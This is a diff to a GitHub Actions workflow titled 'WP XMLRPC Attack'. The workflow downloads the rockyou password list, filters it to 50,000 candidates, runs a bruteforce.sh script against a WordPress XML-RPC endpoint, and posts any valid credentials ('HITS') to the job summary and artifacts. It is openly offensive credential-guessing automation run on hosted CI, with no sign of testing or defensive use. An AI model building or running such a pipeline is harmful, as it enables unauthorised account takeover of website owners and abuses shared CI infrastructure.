@@ -1,12 +1,10 @@
 name: WP XMLRPC Attack
 
 on:
-  push:
-    branches: [main]
   workflow_dispatch:
     inputs:
       phase:
-        description: 'Phase to run (1=targeted, 2=rockyou, all=both)'
+        description: 'Phase to run'
         required: true
         default: 'all'
         type: choice
@@ -24,33 +22,31 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Install dependencies
-        run: sudo apt-get update -qq && sudo apt-get install -y -qq curl wget
-
       - name: Download rockyou
         if: inputs.phase == 'all' || inputs.phase == 'rockyou'
         continue-on-error: true
         run: |
-          wget -q --timeout=30 "https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/rockyou.txt.tar.gz" -O rockyou.txt.tar.gz || \
-          wget -q --timeout=30 "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/rockyou.txt" -O rockyou_filtered.txt
-          if [ -f rockyou.txt.tar.gz ]; then
-            tar -xzf rockyou.txt.tar.gz 2>/dev/null || true
+          curl -sL "https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/rockyou.txt.tar.gz" -o rockyou.tar.gz
+          if [ -f rockyou.tar.gz ] && [ -s rockyou.tar.gz ]; then
+            tar -xzf rockyou.tar.gz 2>/dev/null || true
             [ -f rockyou.txt ] && mv rockyou.txt rockyou_filtered.txt
           fi
-          if [ -f rockyou_filtered.txt ]; then
-            echo "Rockyou downloaded: $(wc -l < rockyou_filtered.txt) lines"
+          if [ ! -f rockyou_filtered.txt ]; then
+            curl -sL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/rockyou.txt" -o rockyou_filtered.txt
+          fi
+          if [ -f rockyou_filtered.txt ] && [ -s rockyou_filtered.txt ]; then
             grep -E '^[A-Za-z0-9!@#$%^&*]{8,16}$' rockyou_filtered.txt | head -50000 > rockyou_filtered_tmp.txt
             mv rockyou_filtered_tmp.txt rockyou_filtered.txt
-            echo "Filtered: $(wc -l < rockyou_filtered.txt) passwords (8-16 chars)"
+            echo "Rockyou ready: $(wc -l < rockyou_filtered.txt) passwords"
           else
-            echo "WARNING: rockyou download failed, skipping Phase 2"
+            echo "WARNING: rockyou download failed"
           fi
 
       - name: Run Brute Force
         continue-on-error: true
         run: |
           chmod +x bruteforce.sh
-          bash bruteforce.sh || true
+          bash bruteforce.sh
         env:
           PHASE: ${{ inputs.phase }}
 
@@ -58,7 +54,7 @@ jobs:
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: bruteforce-results-${{ github.run_id }}
+          name: results-${{ github.run_id }}
           path: |
             results.txt
             bruteforce.log
@@ -68,18 +64,16 @@ jobs:
       - name: Summary
         if: always()
         run: |
-          echo "## WordPress Brute Force Results" >> $GITHUB_STEP_SUMMARY
+          echo "## Brute Force Results" >> $GITHUB_STEP_SUMMARY
           echo "" >> $GITHUB_STEP_SUMMARY
           if [ -f results.txt ] && [ -s results.txt ]; then
-            echo "### HITS FOUND:" >> $GITHUB_STEP_SUMMARY
+            echo "### HITS:" >> $GITHUB_STEP_SUMMARY
             cat results.txt >> $GITHUB_STEP_SUMMARY
           else
-            echo "No valid credentials found." >> $GITHUB_STEP_SUMMARY
+            echo "No credentials found." >> $GITHUB_STEP_SUMMARY
           fi
           echo "" >> $GITHUB_STEP_SUMMARY
           if [ -f bruteforce.log ]; then
-            echo "### Last 20 lines of log:" >> $GITHUB_STEP_SUMMARY
-            tail -20 bruteforce.log >> $GITHUB_STEP_SUMMARY
-          else
-            echo "No log file found." >> $GITHUB_STEP_SUMMARY
+            echo "### Log (last 30 lines):" >> $GITHUB_STEP_SUMMARY
+            tail -30 bruteforce.log >> $GITHUB_STEP_SUMMARY
           fi
